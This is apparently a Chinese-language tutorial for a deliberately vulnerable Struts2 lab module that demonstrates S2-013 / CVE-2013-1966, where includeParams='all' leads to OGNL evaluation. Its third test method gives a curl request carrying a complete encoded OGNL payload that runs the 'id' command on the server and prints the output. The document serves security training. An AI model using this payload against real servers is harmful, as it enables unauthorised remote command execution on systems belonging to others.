# struts2-s2-013 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-013`
- 端口：`9959`
- 推荐入口：`/link.action`

## 这是什么

Struts2 `S2-013 / CVE-2013-1966` 演示靶场。这个模块在页面里同时用了 `<s:a includeParams="all">` 和 `<s:url includeParams="all">`；当请求带着恶意参数进入页面时，Struts2 在重建链接参数时会对参数值做 OGNL 渲染。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9959` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9959/link.action`。
2. 先点 `回显 whoami` 或 `回显 id`。
3. 再点 `带参数访问当前页`，观察链接渲染时是否直接触发执行。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_013、s2-013、struts2` 过滤到当前项目。
3. 先跑 `struts2_s2_013_attack_id`。
4. 再跑 `struts2_s2_013_normal` 做对照。

推荐直接使用的首页条目：
- `struts2_s2_013_attack_id`：通过 `includeParams="all"` 触发命令执行
- `struts2_s2_013_normal`：页面基线访问

## 方式三：直接访问接口测试

1. 触发漏洞：

```bash
curl -i "http://宿主机IP:9959/link.action?a=%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%23b%3Dnew+java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew+java.io.BufferedReader%28%23b%29%2C%23d%3Dnew+char%5B256%5D%2C%23c.read%28%23d%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23d%29%29%2C%23out.close%28%29%29%7D"
```

2. 基线访问：

```bash
curl -i "http://宿主机IP:9959/link.action"
```

## 测试时重点看什么

1. 页面里 `<s:a>` 和 `<s:url>` 生成链接时是否会把当前请求参数带进去。
2. 带入的参数值是否发生 OGNL 渲染。
3. 无参数访问时是否只是普通页面渲染。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
